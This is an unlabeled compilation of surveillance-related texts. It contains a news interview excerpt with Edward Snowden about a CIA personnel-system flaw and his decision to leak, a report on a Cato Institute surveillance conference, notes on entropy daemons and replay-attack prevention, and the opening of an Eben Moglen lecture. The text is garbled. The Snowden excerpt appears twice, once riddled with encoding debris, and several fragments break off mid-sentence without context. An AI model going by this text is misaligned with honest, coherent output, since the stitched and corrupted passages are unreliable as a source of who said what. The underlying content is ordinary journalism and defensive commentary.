about a computer vulnerability.
Mr. Snowden said that in 2008 and 2009, he was working in Geneva as a
telecommunications information systems officer, handling everything
from information technology and computer networks to maintenance of
the heating and air-conditioning systems. He began pushing for a
promotion, but got into what he termed a “petty e-mail spat” in which
he questioned a senior manager’s judgment.
Several months later, Mr. Snowden said, he was writing his annual
self-evaluation when he discovered flaws in the software of the
C.I.A.’s personnel Web applications that would make them vulnerable to
hacking. He warned his supervisor, he said, but his boss advised him
to drop the matter and not rock the boat. After a technical team also
brushed him off, he said, his boss finally agreed to allow him to test
the system to prove that it was flawed.
He did so by adding some code and text “in a nonmalicious manner” to
his evaluation document that showed that the vulnerability existed, he
said. His immediate supervisor signed off on it and sent it through
the system, but a more senior manager — the man Mr. Snowden had
challenged earlier — was furious and filed a critical comment in Mr.
Snowden’s personnel file, he said.
He said he had considered filing a complaint with the C.I.A.’s
inspector general about what he considered to be a reprisal, adding
that he could not recall whether he had done so or a supervisor had
talked him out of it. A C.I.A. spokesman declined to comment on Mr.
Snowden’s account of the episode or whether he had filed a complaint.
But the incident, Mr. Snowden said, convinced him that trying to work
through the system would only lead to punishment. He said he knew of
others who suffered reprisals for what they had exposed, including
Thomas A. Drake, who was prosecuted for disclosing N.S.A. contracting
abuses to The Baltimore Sun. (He met with Mr. Snowden in Moscow last
week to present an award to him for his actions.) And he knew other
N.S.A. employees who had gotten into trouble for embarrassing a senior
official in an e-mail chain that included a line, referring to the
Chinese Army, that said, “Is this the P.L.A. or the N.S.A.?”
Mr. Snowden added that inside the spy agency “there’s a lot of dissent
— palpable with some, even.” But he said that people were kept in line
through “fear and a false image of patriotism,” which he described as
“obedience to authority.”
He said he believed that if he tried to question the N.S.A.’s
surveillance operations as an insider, his efforts “would have been
buried forever,” and he would “have been discredited and ruined.” He
said that “the system does not work,” adding that “you have to report
wrongdoing to those most responsible for it.”
Mr. Snowden said he finally decided to act when he discovered a copy
of a classified 2009 inspector general’s report on the N.S.A.’s
warrantless wiretapping program during the Bush administration. He
said he found the document through a “dirty word search,” which he
described as an effort by a systems administrator to check a computer
system for things that should not be there in order to delete them and
sanitize the system.
“It was too highly classified to be where it was,” he said of the
report. He opened the document to make certain that it did not belong
there, and after he saw what it revealed, “curiosity prevailed,” he
After reading about the program, which skirted the existing
surveillance laws, he concluded that it had been illegal, he said. “If
the highest officials in government can break the law without fearing
punishment or even any repercussions at all,” he said, “secret powers
become tremendously dangerous.”
He would not say exactly when he read the report, or discuss the
timing of his subsequent actions to collect N.S.A. documents in order
to leak them. But he said that reading the report helped crystallize
his decision. “You can’t read something like that and not realize what
it means for all of these systems we have,” he said.
Mr. Snowden said that the impact of his decision to disclose
information about the N.S.A. had been bigger than he had anticipated.
He added that he did not control what the journalists who had the
documents wrote about. He said that he handed over the documents to
them because he wanted his own bias “divorced from the decision-making
of publication,” and that “technical solutions were in place to ensure
the work of the journalists couldn’t be interfered with.”
Mr. Snowden declined to provide details about his living conditions in
Moscow, except to say that he was not under Russian government control
and was free to move around.

promotion, but got into what he termed a petty e-mail spat in which
he questioned a senior manager's judgment.
Several months later, Mr. Snowden said, he was writing his annual
self-evaluation when he discovered flaws in the software of the
C.I.A.s personnel Web applications that would make them vulnerable to
hacking. He warned his supervisor, he said, but his boss advised him
to drop the matter and not rock the boat. After a technical team also
brushed him off, he said, his boss finally agreed to allow him to test
the system to prove that it was flawed.
He did so by adding some code and text in a nonmalicious manner=94 to
his evaluation document that showed that the vulnerability existed, he
said. His immediate supervisor signed off on it and sent it through
the system, but a more senior manager the man Mr. Snowden had
challenged earlier was furious and filed a critical comment in Mr.
Snowden's personnel file, he said.
He said he had considered filing a complaint with the C.I.A.=92s
inspector general about what he considered to be a reprisal, adding
that he could not recall whether he had done so or a supervisor had
talked him out of it. A C.I.A. spokesman declined to comment on Mr.
Snowden's account of the episode or whether he had filed a complaint.
But the incident, Mr. Snowden said, convinced him that trying to work
through the system would only lead to punishment. He said he knew of
others who suffered reprisals for what they had exposed, including
Thomas A. Drake, who was prosecuted for disclosing N.S.A. contracting
abuses to The Baltimore Sun. (He met with Mr. Snowden in Moscow last
week to present an award to him for his actions.) And he knew other
N.S.A. employees who had gotten into trouble for embarrassing a senior
official in an e-mail chain that included a line, referring to the
Chinese Army, that said, Is this the P.L.A. or the N.S.A.?
Mr. Snowden added that inside the spy agency theres a lot of dissent
 palpable with some, even. But he said that people were kept in line
through fear and a false image of patriotism, which he described as
obedience to authority.
He said he believed that if he tried to question the N.S.A.s
surveillance operations as an insider, his efforts would have been
buried forever, and he would have been discredited and ruined.=94 He
said that the system does not work, adding that you have to report
wrongdoing to those most responsible for it.
Mr. Snowden said he finally decided to act when he discovered a copy
of a classified 2009 inspector generals report on the N.S.A.s
warrantless wiretapping program during the Bush administration. He
said he found the document through a dirty word search, which he
described as an effort by a systems administrator to check a computer
system for things that should not be there in order to delete them and
sanitize the system.
"It was too highly classified to be where it was," he said of the
report. He opened the document to make certain that it did not belong
there, and after he saw what it revealed, curiosity prevailed, he
After reading about the program, which skirted the existing
surveillance laws, he concluded that it had been illegal, he said. =93If
the highest officials in government can break the law without fearing
punishment or even any repercussions at all, he said, secret powers
become tremendously dangerous.
He would not say exactly when he read the report, or discuss the
timing of his subsequent actions to collect N.S.A. documents in order
to leak them. But he said that reading the report helped crystallize
his decision. You cant read something like that and not realize what
it means for all of these systems we have," he said.
Mr. Snowden said that the impact of his decision to disclose
information about the N.S.A. had been bigger than he had anticipated.
He added that he did not control what the journalists who had the
documents wrote about. He said that he handed over the documents to
them because he wanted his own bias divorced from the decision-making
of publication, and that technical solutions were in place to ensure
the work of the journalists couldn't be interfered with."
Mr. Snowden declined to provide details about his living conditions in
Moscow, except to say that he was not under Russian government control
and was free to move around.

yes, they work great. but they're not readily available, and as an
entropy source they're still low bit rate. you've got at best ~8Mhz of
sample with a low entropy density; effective consumer entropy
production from this setup will be a fraction of this rate. the

to run in this mode your entropy daemon would read some bytes from the
kernel pool via /dev/random, mix those bytes with the collected
entropy, then feed back into the pool with the same entropy estimate.
in this way you're not "feeding" entropy from your HWRNG but instead
using it to improve the entropy collected via other sources (like high
res timers, etc.)
to be honest i've never considered running in this mode - the main
benefit of a HWRNG is the improvement in entropy generation and this
approach does not provide any such improvement.
this is what the "mixing" or "blinding" step of an entropy daemon
does: obscure the state of the HWRNG and compress the sampled entropy
via cryptographically secure digests or ciphers. (there are a few
different constructions for this, you should pursue the literature :)

Ronald Bailey | Oct. 18, 2013 1:30 pm
Last week the Cato Institute put on a terrific conference about
unconstitutional domestic spying. The Cato conference took place after
a summer of alarming revelations of just how deep and extensive the
feds’ secret surveillance of our everyday communications had become.
The conference, held at the institute’s downtown D.C. headquarters,
brought some of the most knowledgeable Internet luminaries together
with some of the fiercest fighters for Americans’ Fourth Amendment
Watchdog organizations such as the Electronic Frontier Foundation
(EFF) and the American Civil Liberties Union (ACLU) had sought for
years to expose the extent and depth of federal surveillance, but
their efforts were largely stymied by the very walls of secrecy they
were trying to breach. In the 2006 case Hepting v. AT&T, for example,
the EFF sued the giant telco for the privacy violations incurred by
allowing the National Security Agency (NSA) to wiretap and data-mine
all of the company’s customers’ communications. To forestall this
case, Congress in 2008 passed the FISA Amendments Act, conferring
retroactive immunity on the telephone companies and government
agencies for engaging in warrantless wiretapping. Earlier this year,
the U.S. Supreme Court rejected a challenge to the FISA Amendments Act
by the ACLU and other groups, on the grounds that they had no standing
to sue because they could not actually prove that the NSA was spying
on them. This is Catch-22 logic: The ACLU needs to sue the NSA to get
the evidence that the agency spied on it and its clients, but they
can’t sue because they have no evidence that the agency spied on them.
The walls of surveillance secrecy were finally cracked by the June
revelations of whistleblower Edward Snowden. Snowden’s files
conclusively show that the federal government has been operating a
vast spying program that violates the Fourth Amendment rights of tens
of millions of ordinary Americans. To justify this surveillance, the
government offers tortured legal interpretations of Section 702 of the
Foreign Intelligence Surveillance Act and Section 215 of the PATRIOT
Section 702 authorizes warrantless surveillance of the communications
of foreigners outside of the United States. As Snowden’s documents
reveal, the NSA has interpreted Section 702 as a backdoor loophole
allowing the agency to retain and comb through the call data and
emails of Americans whose communications are “about” a terror suspect
or have been “inadvertently” intercepted by the NSA’s PRISM monitoring
program. The even more egregious violations of our constitutional
rights, Snowden revealed, occurred under Section 215 of the PATRIOT
Act, which the NSA has used to justify the dragnet collection and
retention of the call metadata of essentially all Americans. (Metadata
includes the numbers called and the location, date, time, and duration
of each call.)
The first keynote at the Cato conference was delivered by Sen. Ron
Wyden (D-Ore.), who cited the “revelations of June” numerous times.
Several speakers used such circumlocutions during the conference,
clearly as a way to avoid actually speaking the name of the man who
finally broke the news that our government has been unconstitutionally
spying on us for years. Despite his reticence with regard to Snowden,
Wyden has been at the lonely forefront of the fight to rein in
America’s growing surveillance state. It was Wyden who asked Director
of National Intelligence James Clapper in a March hearing whether the
agency collected any sort of data on hundreds of millions of
Americans. “No, sir,” lied Clapper. “Not wittingly.”
After Snowden’s revelations proved that Clapper was a liar, Clapper
attempted to justify himself in a June television interview by
suggesting that “collect” doesn’t mean the same thing to him that it
means to ordinary Americans. “Collect,” Clapper claimed, doesn’t mean
intercepting and storing data about telephone calls; the data are only
“collected” when the agency goes searching through its vast databases
looking for specific calls. At the Cato conference, New York Times
national security reporter Charlie Savage pointed out that “Congress
doesn’t know that there is a secret lexicon at the NSA in which words
mean something else at the NSA.” He recommended that people might want
to look up the Electronic Frontier Foundation’s helpful NSA glossary,
which shows how the agency reinterprets normal words in ways that
ordinary people would say amount to “lies.” Another speaker, Rep.
Justin Amash (R-Mich.), said that Clapper should step down and be
prosecuted for lying to Congress.
During his morning keynote, Wyden outlined the main provisions of a
new bill he introduced with Sens. Mark Udall (D-Utah), Richard
Blumenthal (D-Conn.), and Rand Paul (R-Ky.) two weeks earlier. The
bill would end the mass collection of American’s communication data,
close the backdoor search loophole under FISA Section 702, provide an
advocate to argue against government abuses before the Foreign
Intelligence Surveillance Court, and enable citizens to be heard in
federal courts when they believe that the surveillance agencies have
violated their Fourth Amendment right to privacy. In addition,
telecommunications companies would be enabled to disclose more
information about their cooperation with government surveillance
Wyden warned that the agency heads and their enablers in the Congress,
such as Senate Intelligence Committee Chair Dianne Feinstein
(D-Calif.), would be striking back against proposals for increased
transparency. “Their objective is to fog up the surveillance debate,”
he explained, “and convince Congress and the public that the real
problem is not unconstitutional surveillance, the real problem is
sensationalistic reporting.” Wyden is encouraged, however, by the
broader reaction to the “revelations of June.” Referring to the Amash
amendment, a July measure that sought to cut funding to the NSA’s bulk
collection of Americans’ phone records, Wyden said, “If you’d told me
that you could get 200 votes on the floor of the House of
Representative, I would have said you’re dreaming.” The amendment
failed, but the vote was surprisingly close.
Of course, that vote was only possible because of Snowden’s
disclosures. Yet in July, when Wyden was asked whether Snowden is a
hero or a villain, he replied that “when there is an individual who’s
been charged criminally and he has been charged with espionage, I
don’t get into commenting beyond that.” Wyden should comment, and his
comment should be: “Thank you, Edward Snowden.”
Next up at the conference was a panel of national security reporters
moderated by Cato’s Julian Sanchez. The panelists were Bart Gellman of
the Washington Post, Spencer Ackerman of The Guardian, Siobhan Gorman
of The Wall Street Journal, and Charlie Savage of The New York Times.
Gellman was the first speaker to say the word “Snowden,” noting that
the whistleblower’s greatest fear was that the risks he took would be
all for nothing; that there would be no debate over the extent and
intrusiveness of domestic surveillance. In fact, Gellman declared,
“Snowden succeeded beyond his wildest dreams.”
Gellman also said that Clapper wasn’t the only administration official
to lie to Congress. NSA chief Keith Alexander wasn’t telling the truth
when he claimed a year ago that his agency does “not hold data on U.S.
citizens” at its gigantic new data facility in Bluffdale, Utah. And
the Justice Department had certainly been misleading, even if it
didn’t technically lie, when it said the Section 215 authorities had
been used only 20 to 30 times to collect data. Yes, but those 20 to 30
times allowed the NSA to collect trillions of records.
Gorman added that the Snowden revelations had “shaken the trees” and
prompted other reporting that has forced other government disclosures
about various domestic spying efforts. For example, the NSA has tapped
the Internet backbone through secret agreements with nine major (but
unnamed) U.S. telecommunications companies. This has given the agency
the capacity to monitor 75 percent of all U.S. Internet
communications. Once it was revealed that the big telecommunications
companies were cooperating with the NSA spying program, Gellman noted,
they started agitating to be allowed to disclose more about what they
are being asked and ordered to do.
The luncheon keynote was delivered by Rep. Amash, who described how
spy agencies try to limit congressional access to information about
their activities, making meaningful oversight all but impossible.
Agencies speak in generalities and then engage in a game of 20
questions with legislators who seek deeper knowledge. They might, for
example, answer a query with “No, our agency doesn’t do that” without
mentioning that another agency does.
Amash described one occasion in which he was seeking to review a
particular document and the agency promised to arrange for members of
Congress to do so. The agency did not send a message that the document
was available for scrutiny by emailing members’ offices directly;
instead it sent the notification through the more general and less
read Dear Colleague email system. Even then, the document was
available for review only between 9 a.m. and noon in a briefing room
on the day just before Congress was scheduled to leave for vacation.
Members who reviewed the document also had to sign a nondisclosure
agreement saying that they would not discuss it with other members who
had not seen it.
After lunch, the conference featured a panel of legal experts, many of
whom have tangled in court with the NSA and the Justice Department.
Georgetown law professor Laura Donohue argued that the Foreign
Intelligence Surveillance Court (FISC) was solely created to supervise
spying on foreign powers and their agents. Under statute, the FISC is
supposed to review and grant orders under Section 215 only when
agencies supply “a statement of fact showing that there are reasonable
grounds to believe that tangible things sought are relevant to an
authorized investigation.”
Donohue argues that the FISC and the NSA have now interpreted
“relevant” to include all data on all telephone calls, and possibly
other records, such as data on all emails, financial records, medical
records, and so forth. As such, Section 215 orders function as general
warrants allowing officials to rifle through the records of any
American without the need to show probable cause as delimited by the
Fourth Amendment.
The ACLU’s Jameel Jaffer agreed that the NSA’s dragnet collection of
phone records violates the relevance standard of Section 215. He also
argued that it violated Americans’ reasonable expectations of privacy
under the Fourth Amendment and, less obviously, our right of free
association under the First Amendment. If people think they are
watched by government agents, he explained, they may curtail innocuous
contacts with others out of fear that government functionaries will
misinterpret or abuse information about their relationships. David
Lieber, privacy counsel for Google, struck another First Amendment
note, expressing frustration over the government’s prior restraint of
speech when it forbade his company (and others) from disclosing even
summary statistics on how much information on its customers the feds
were requiring it to turn over.
Paul Rosenzweig, a former deputy assistant for policy at the
Department of Homeland Security, is much more sanguine about NSA
domestic surveillance. He offered a very nice demonstration, produced
by journalist Kieran Healy based on David Hackett Fischer’s biography
of Paul Revere, showing how metadata on various club memberships would
have identified Paul Revere to the British authorities as the center
of terrorist network in late-18th-century Boston. That may sound
alarming to you, but to Rosenzweig the NSA’s use of such relational
data-mining is “relevant” to an investigation.
The second afternoon panel focused on techniques to protect data from
federal surveillance. First, the good news: Jim Burrows of Silent
Circle, a new company offering various encryption services, observed
that TOR, the free open source software that protects users’
anonymity, generally stands up to NSA snooping. Less happily, David
Dahl of SpiderOak, a company that offers encrypted file backup,
decried the recent revelations that the NSA had succeeded in
introducing subtle vulnerabilities by influencing the development of
encryption standards. Matt Blaze, an Internet security guru at the
University of Pennsylvania, observed that maintaining vulnerabilities
in computer code doesn’t just make it easier for the NSA to spy; it
makes it easier for the Chinese, Russians, and Iranians to spy, and
for Internet criminals to steal data and cause other havoc.
Burrows discussed the case of Lavabit, an encrypted email service
apparently used by Snowden. The NSA ordered Ladar Levison, the owner
of the service, to hand over data that would enable the agency to spy
on his 350,000 customers. Levison instead shut down the service,
saying that he refused “to become complicit in crimes against the
American people.” Burrows noted that Silent Circle was also an
offering encrypted email service. Within 10 hours of learning what had
happened to Lavabit, Silent Circle shut down and purged its own
service without notice to subscribers. Burrows noted that had Silent
Circle informed its customers in advance the shutdown might have
become illegal. “We knew for sure that someday some law enforcement
agency would order us to give them a backdoor,” said Burrows.
Burrows noted that there is no email that is currently secure against
metadata collection, although users can securely encrypt the content
of their messages. The ACLU’s Chris Soghoian added that the laws of
physics make it impossible to shield the location data emitted by
mobile phones. SpiderOak’s Dahl speculated that some peer-to-peer
communications protocols with built-in cryptography might make secure
email possible.
The final panel considered what reforms are necessary to rein in
domestic surveillance. Cato Senior Fellow John Mueller demolished the
claim that the NSA’s domestic spying has done much to protect
Americans against terrorism. NSA chief Alexander claimed in June that
mass telephone surveillance program had thwarted 54 terrorist plots.
In October, Alexander admitted in a Senate hearing that the telephone
dragnet’s effect was much more modest: It may have helped in one or
maybe two cases.
“The Obama administration has doubled down on this program and doesn’t
believe that it has done anything wrong,” despaired Michelle
Richardson, legislative counsel for the ACLU. Center for Democracy and
Technology senior counsel Kevin Bankston remarked that it is “insane”
that Google’s privacy counselor David Lieber “had to dance around the
question of receiving requests from the NSA.” People are free to say
they haven’t received such requests, but they’re not allowed to tell
anyone when they have.
“The NSA has turned the Internet into a giant surveillance platform,”
declared renowned tech guru and Harvard Berkman Center fellow Bruce
Schneier. Metadata collection that tells spies where a person went,
who he spoke to, what he bought, and what he saw equals surveillance.
“When the president says, ‘It’s just metadata,’” he means, “Don’t
worry, you’re all under surveillance all of the time.” Schneier argued
that we need to make the Internet secure against all attackers. “A
secure Internet is in everyone’s interests,” said Schneier. “We are
all better off if no one can do this kind of bulk surveillance.
Fundamentally, security is more important than surveillance.” The
panel agreed that it is critical to pass legislation preventing the
government from mandating that companies build spy-friendly
insecurities into their systems.
The final keynote speaker, Rep. James Sensenbrenner (R–Wisc.),
outlined the contours of his Uniting and Strengthening America by
Fulfilling Rights and Ending Eavesdropping, Dragnet-Collection, and
Online Monitoring (USA FREEDOM) Act. His bill would limit the
collection of phone records to known terrorist suspects, force the
Foreign Intelligence Surveillance Courts to disclose surveillance
policies, establish a constitutional privacy advocate in that court’s
proceedings, and permit companies to disclose NSA information
At the end of conference, the one person whose efforts made it
possible to for new Congressional reform efforts aimed at reining in
the surveillance state went largely unacknowledged. And so, again:
Thank you, Edward Snowden.
Disclosure: I am still a card-carrying member of the ACLU.

1. Don’t ever just dump your leaks on the internet.
2. Make sure your leaks are properly vetted and mediated by proper

This lesson is often, perhaps even usually, stated as, or with, some
variation of the following:

- the encryption and authentication primitives in use
- identity and session management concerns. (e.g. key agreement)
- and of course, run time resource constraints (memory, CPU, bandwidth, etc.)
Syverson's Replay Attack Taxonomy[0] (abridged):
- Run external attacks (one run of protocol to attack subsequent runs)
- Run internal attacks (using one part of protocol to attack itself in same run)
- Classic replay (no contemporaneous or repeated runs needed)
- Interleaving attacks (using concurrent runs of a protocol against
other runs of the same protocol)
provides a foundation for discussing replay attack prevention.
so far i've only come across one good reference design and
implementation of a replay window:
"RFC 4302 - IP Authentication Header - Appendix B: Extended (64-bit)
Sequence Numbers"
and encountered a number of other options for replay prevention in the
context of key agreement or transport privacy:
- time stamping messages
- sequence numbering messages
- type tagging messages
- identity tagging messages (reflection prevention)
- ensuring full information priciple when using hash functions
- generating session keys without mutual trust
- triple passwords (kerberos)

"Westward the Course of Empire - Part 1"
A talk given by Eben Moglen at Columbia Law School on October 9th, 2013
  WebM: mp4: Good afternoon.
There is no introduction. After 26 years in this place it feels
ridiculous to me to pretend that anyone is especially honored by my
presence here.
If I am to be frank about it, I invited myself. Not in the way that
Edward Snowden invited himself to Sheremetyevo Airport. Nor in the way
that Julian Assange invited himself to the Ecuadorian embassy in
London. Surely not in the way that Chelsea Manning invited herself to
35 years in Fort Leavenworth. No, law professor-like I have assigned
myself no onerous duties. I undertook nothing more than to come here
and to tell you the truth.
I don't wish to force my ideas on anybody, but the truth is that I
feel forced to speak myself. No one will remember much of what I have
to say, but of the things about which I came here to speak—both those
that have been done and those that remain to be done—I must say that
they will never be forgotten.
In the third chapter of his History of the Decline and Fall of the
Roman Empire, Edward Gibbon gives two reasons why the slavery into
which the Romans tumbled under Augustus and his successors left them
more wretched than any previous human slavery.
In the first place, Gibbon said, the Romans had carried with them into
slavery the culture of a free people—their language and their
conception of themselves as human beings presupposed freedom. And
thus, Gibbons says, oppressed as they were by the weight of their
corruption and military violence, the Romans yet preserved for a long
time the sentiments, or at least the ideas, of a freeborn people. In
the second place, the empire of the Romans filled all the world, and
when that empire fell into the hands of a single person, the world was
a safe and dreary prison for his enemies. As Gibbon says, to resist
was fatal, and it was impossible to fly.
The power of that Roman Empire rested in its control of
communications. The Mediterranean Sea, which was the transit hub of
every western civilization, was their lake. And across their European
empire, from Scotland to Syria, they pushed the roads—roads that
fifteen centuries later were still primary arteries of European
transportation. Down those roads which, as Gibbon says, rendered every
corner of the Empire pervious to Roman power, the Emperor marched his
armies. But up those roads he gathered his intelligence. Augustus
invented the posts: first for signals intelligence, to move couriers
and messages at the fastest possible speeds; and then for human
intelligence. He created the post-chaises, so that, as Gibbon says,
those who were present when dispatches were written could be
questioned by the Emperor. Using that infrastructure for control of
communications, with respect to everything that involved the
administration of power, the Emperor of the Romans made himself the
best informed human being in the history of the world.
That power eradicated human freedom. "Remember," says Cicero to
Marcellus in exile, "wherever you are, you are equally within of the
power of conqueror."
The empire of the United States, the global empire that followed from
victory in the Second World War, also depended upon control of
communications. Possibly the greatest military lesson of the Second
World War was that he who has access to his adversaries' military
communications prevails. At every level, from the tactical artillery
duel to the greatest strategic naval confrontations in the Pacific,
the new pace of warfare gave victory to the one who knew the other
side's plans first.
This was all the more obviously crucial in the development of the
power to rule the world when, a mere twenty years later, the empire of
the United States was locked in a confrontation of nuclear
annihilation with the Soviet empire—a war of submarines hidden in the
dark below the continents, capable of eradicating human civilization
in less than an hour in an imperial confrontation whose rule of
engagement was "launch on warning." Thus it was that the Empire of the
United States came to have precisely the same view of the effort to
render everywhere pervious to American power that had been the view of
Emperor Augustus. And our listeners aspired to everything.
Now, the structure of listening which came out of the Second World
War—the spying on signals, the stealing of signals and the breaking of
codes—this was, under everybody's understanding of the new order of
power in the world, the crucial center of it all. And, while it has
been commonplace to recognize since the end of the Cold War that the
United States has spent for decades as much on its military might as
all other powers in the world combined, it has not necessarily
followed in people's consciousness that we applied to the stealing of
signals and the breaking of codes a similar proportion of our
That system of listening, which had at its center the same reality of
power, that system which grew up under the National Security Act and
its successor legislation in the United States, had a particular
systemic form: listening was under military command, controlling large
civilian workforces. That structure, of course, presupposed precisely
the foreign intelligence nature of the activity. Military control was
both a symbol and a guarantee of the nature of the activity being
pursued: everybody understood that if you had put such activity
domestically under military control you would have violated the
fundamental principle of the civilian control of the government of the
United States.
Instead what we had was a foreign intelligence service regarded as the
most important basis of American power, responsible to the chief
executive of the United States as commander-in-chief, and based in
military control and military integrity. Because, of course, integrity
was the other side of this coin. Military control ensured absolute
command deference with respect to the fundamental principle which made
it all "all right," which was: "No Listening Here." The boundary
between home and away was the boundary between absolutely permissible
and absolutely impermissible—between the world in which those whose
job it is to kill people and break things instead stole signals and
broke codes, and the constitutional system of ordered liberty.
There's lots to be said—and we will need to say it as our time
together goes by—about the morality of that assumption. But I must ask
you to keep in mind that it also was accompanied by the reality of
communications in the twentieth century, which were hierarchically
organized and very often state-controlled. When the United States
Government chose to listen to other governments abroad—to their
militaries, to their diplomatic communications, to their policy-makers
where they could—they were listening in a world of defined targets. As
to which they were roughly entitled to their favored assumption, which
was that everybody else was listening back at them on those targets
pretty much just as hard as they could, which was of course way less
hard than we, because we were the Empire. On this basis, we formed
fundamental alliances with the other English-speaking societies in the
world for a complete cooperation of signals intelligence, based around
two fundamental predicates: the listeners in each of the English
speaking societies were not listening at home, and they were not
spying on one another. Therefore they and we stood back to back in
their listening against the world. And on that basis, in the era of
the digital computer, we began to be capable of taking everything.
"Everything" was defined as all signals in the electromagnetic
spectrum and its copper wire accessories. The basic principle was:
hack, tap, steal—where the roof of every US embassy, and every
American naval asset at sea, and every other place that we could cram
antennas held the ones that we wanted to have there. And where every
deal that we could make for exchange of signals intelligence among
parties committed to listening gave us everything. Thus we could get
what we needed, and we felt we needed it all.
In the beginning we listened to militaries and their governments.
Later we monitored the flow of international trade as far as it
engaged American national security interests.
But there is this about the weapons of war: In 1937, bombing civilian
populations from the air was an innovation in the criminality of war,
and Pablo Picasso found it worthy of his work. Less than a decade
later, dozens of the greatest cities in the world lay in rubble and
United States Government had dropped nuclear weapons on cities in
Japan. Now the United States Government considers aerial bombardment
to be the cleanest form of war.
In the beginning we listened to armies, embassies, diplomats,
government officials. Then we listened to the global economy. Now we
are being told that spying on entire societies is normal.
The regime that we built to defend ourselves against nuclear
annihilation, in a world where access to the other fellow's signals is
what makes victory, came at the end of the twentieth century under two
forms of profound social restructuring. In the first place, the Cold
War ended and the Soviet Union dissolved. An entire establishment of
national security—which continues to absorb more resources in the
United States than in all the rest of the world put together, and I am
including the listeners—an entire national security structure
re-purposed itself, not to spy upon an empire with twenty-five
thousand nuclear weapons pointed down our throats, but at the entire
population of the world in order to locate a few thousand people
minded to various kinds of mass murder.
In the second place, the nature of human communication changed. The
system that they built, with all of its arrangements, was dependent as
I said upon fixed targets: a circuit, a phone number, a license plate,
a locale. The question of capacity was about how many targets you
could simultaneously follow in a world where each of them required
hack, tap, steal. But what happened at the beginning of the
twenty-first century was that we acquired a new way of communicating
in the human race—the beginning of the beginning of the beginning of
the nervous system we are building in which each human being is a
neuron in that great hive-mind called humanity. And from the moment we
began to do that, two things began to fail: the simplicity of "one
target one circuit" went away, and the difference between inside and
outside vanished too.
In particular it vanished in the United States, because so much of the
intelligence of the brain being built for humanity, for better and for
worse, resided here. Therefore the question "do we listen inside?"
came to seem like a question about "are we going to lose the ability
to listen at all?" About which, of course, fundamental doctrine of
national security—whatever "national security" means—had only one
acceptable answer.
Into this mixture, of the structures of the twentieth-century imperial
power and the reality of twenty-first century technology, a vastly
imprudent American administration then intervened.
Whatever else, history will record of them that they didn't think long
before acting. Presented with a national calamity which also
constituted a political opportunity, nothing stood between them and
all the mistakes that haste can make for history to repent at leisure.
And what they did, of course—in secret, with the assistance of judges
chosen by a single man operating in secrecy, and with the connivance
of many decent people who believed themselves to be doing the only
thing that would save the society—was to unchain the listeners from
Not only had circumstances destroyed the simplicity of "no listening
inside," not only had fudging with the Foreign Intelligence
Surveillance Act carried them into the land where law no longer
provided them with useful landmarks, but they wanted to do it—let's be
frank, they wanted to do it. Their view of the nature of human power
was Augustan if not august. They wanted what it is forbidden to wise
people to take unto themselves. And so they fell, and we fell with
Our journalists failed. The New York Times allowed the 2004 election
not to be informed by things that it knew, having made a decision
which, no matter how many Pulitzer prizes it goes on to win, will
always be a pain in our recollections (if not elsewhere).
We failed collectively to show any outrage, because we were afraid. We
did not demand the end at the beginning. And now we're a long way in.
We had our Guernica and we paid little attention. And there weren't
any limits anymore. They were living in an evolving net, with
conscriptable digital brains gathering intelligence on all the human
race for mere purposes of bagatelle and capitalism. So they perverted
those places. And to the network operators we gave legal immunity in
the United States for complicity, thus easing the way further.
Then, there began a revolt inside.
In Hong Kong, during his brief career as a public thinker and
speaker—which I commend to your attention and which we will spend much
time talking about in future times together—in his career as a public
commentator, Edward Snowden said a very straightforward and useful
thing; he said, analysts are not bad people, and they don't want to
think of themselves that way, but they came to calculate that if a
program produced anything useful, then it was justified.
Because, of course, it was not their job to weigh the fundamental
morality. Which is too bad, because the people whose job it was to
weigh the fundamental morality failed more bitterly than we, and our
journalists, and our everybody else.
They fell, and we fell with them, because they refused to accept that
there is a morality of freedom. And it was the people who worked for
them who felt their failure first. So, from the middle of the first
decade of the twenty-first century, people began to blow whistles all
over the field.
Those courageous people sacrificed their careers, frightened
themselves, sometimes suffered personal destruction, to say that there
was something deeply wrong. Later I shall try and show you both how
they came to those conclusions and what they tried to say. But it is
sufficient for the moment to say that what happened back was: Rule By
Fear. It will be sufficient to say that, in their unwisdom, those who
believed in the importance of the listeners and their activities
sought to deal with those who blew the whistle by the harshest
possible treatment.
It is unfortunate to have to dwell on the extent of the failures, once
the morality of freedom was no longer part of their world. Mr. Snowden
said in Hong Kong that he was sacrificing himself—which he knew he was
doing—in order to save the world from a system like this one
constrained only by policy documents. Next time we meet we shall think
long and hard about the political ideas of Edward Snowden—they are
worthy of your respect and your deep consideration. But for now, once
again, it will be sufficient to say that he was not exaggerating the
nature of the difficulty.
Because of Mr. Snowden, we now know that the listeners, in their
aggressive effort to maintain the security of the United States by
breaking anything that stands in the way of listening, undertook to do
what they repeatedly promised respectable opinion in the trade they
would never do.
Systematically, they attempted what they had once and for all promised
many a time in the discreetest but most credible fashion to
respectable opinion, which then carried their water for them
throughout our world. They always said they would not attempt breaking
the crypto which secures the global financial system.
That was false.
When, on September 6th, the New York Times re-entered the pursuit of
journalism in this area so triumphantly, by revealing the existence of
Bull Run, publishing Mr. Snowden's various disclosures concerning both
the substance of Bull Run and the National Security Agency's
discussions of it, we learned that the United States listeners had
been systematically and deliberately trying to subvert the crypto that
holds the international financial system together, for years. And we
learned a good deal more—which we shall spend more time upon on
another evening, considering carefully what we learned in this
respect—we learned that their efforts had been so far only partially
Within hours they had forfeited respectable opinion around the world,
which had stood solidly in their corner all the way along. The
recklessness of what they had done, and the danger to which it put the
people in the world who don't accept danger from the United States
Government, was breathtaking.
When the morality of freedom is so thoroughly thrown away, it isn't
only the "little people" of the world who suffer, but they do.
The empire of the United States, the one that secured itself by
listening to everything, was the empire of exported liberty. What we
had to offer all around the world was freedom—after colonization,
after European theft, after the forms of twentieth-century horror we
haven't even talked about yet—we offered liberty; we offered freedom.
In the twentieth century we were prepared to sacrifice many of the
world's great cities, and to accept the sacrifice of tens of millions
of human lives, in order to secure our selves against forms of
government we called "totalitarianism," in which the State grew so
powerful and so invasive that it recognized no longer any border of
private life, and brought itself into everything that its subjects
did. Where the State listened to every telephone conversation, and
kept a list of everybody every troublemaker knew.
So let us unfortunately tell the truth as it appeared to the people
who worked in the system: When the morality of freedom was withdrawn,
our State began fastening the procedures of totalitarianism on the
substance of democratic society.
There is no historical precedent for the proposition that the
procedures of totalitarianism are compatible with the system of
enlightened, individual, democratic self-governance. No one has ever
previously in the history of the human race evolved an argument—and as
I will show next time no argument can be evolved—that would give us
any confidence in the ability of the procedures of totalitarianism to
coexist with those of constitutional democratic self-governance. It is
enough to say for now that omnipresent invasive listening creates
